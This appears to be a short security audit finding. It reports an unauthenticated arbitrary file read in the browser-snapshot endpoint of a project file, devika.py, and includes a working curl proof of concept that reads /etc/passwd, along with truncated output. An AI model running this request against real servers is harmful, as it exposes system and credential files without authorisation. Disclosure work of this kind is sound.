# F-H-SNAPSHOT-1: Unauthenticated arbitrary file read via browser-snapshot

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)

## Description
`GET /api/get-browser-snapshot` in `devika.py:125-127` takes `snapshot_path` raw from `request.args` and passes to `send_file` without path validation or authentication. Server binds `0.0.0.0:1337`.

## Impact
Unauthenticated remote client reads any file readable by the server process.

## PoC
```bash
curl "http://<host>:1337/api/get-browser-snapshot?snapshot_path=/etc/passwd"
```

## Execution result
```
HTTP 200, body: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemo..."
```
